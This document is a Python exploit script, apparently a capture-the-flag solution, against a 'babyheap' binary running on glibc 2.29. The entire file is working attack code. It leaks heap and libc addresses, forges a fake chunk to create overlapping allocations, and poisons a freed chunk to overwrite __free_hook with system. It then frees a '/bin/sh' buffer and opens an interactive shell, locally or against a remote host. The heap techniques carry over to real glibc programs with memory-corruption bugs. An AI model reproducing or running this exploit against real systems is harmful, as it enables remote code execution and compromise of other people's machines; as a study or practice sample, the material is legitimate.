#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyheap2.29'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'elocal', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', elocal = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./ld-2.29.so --library-path . {}'.format(bin_file).split(), 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        elocal  = {'argv':'./ld-2.29.so --library-path . {}'.format(bin_file).split()}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = 'libc.so.6', \
                        local   = None, \
                        elocal   = 'libc.so.6', \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    bh = BabyHeap(conn)

    bh.alloc(0x28)  # 0
    bh.alloc(0x28)  # 1
    bh.alloc(0x4f8) # 2
    bh.alloc(0x418) # 3

    bh.delete(1)
    bh.delete(0)

    bh.alloc(0x28)  # 0
    bh.alloc(0x28)  # 1
    addr_heap_base = u(bh.view(0)) - 0x290
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bh.delete(2)
    bh.alloc(0x4f8) # 2
    addr_libc_mainarena= u(bh.view(2)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    fake_chunk  = p64(0)
    fake_chunk += p64(0x51)
    fake_chunk += p64(addr_heap_base + 0x260)*2
    bh.update(0, fake_chunk)
    bh.update(1, '1'*0x20+p64(0x50))

    bh.delete(3)
    bh.delete(2)

    bh.delete(1)
    ow = bh.alloc(0x48) # 1
    bh.update(ow, '/bin/sh\x00'.ljust(0x20)+p64(addr_libc_free_hook))

    bh.alloc(0x28)      # 2
    fh = bh.alloc(0x28) # 3
    bh.update(fh, p64(addr_libc_system))
    bh.delete(ow)

class BabyHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size):
        self.sendlineafter('Command: ', '1')
        self.sendlineafter('Size: ', str(size))
        self.recvuntil('Chunk ')
        return int(self.recvuntil(' ', drop=True))

    def update(self, idx, content):
        self.sendlineafter('Command: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(len(content)))
        self.sendafter('Content: ', content)

    def delete(self, idx):
        self.sendlineafter('Command: ', '3')
        self.sendlineafter('Index: ', str(idx))

    def view(self, idx):
        self.sendlineafter('Command: ', '4')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil(']: ')
        return self.recvuntil('\n1', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
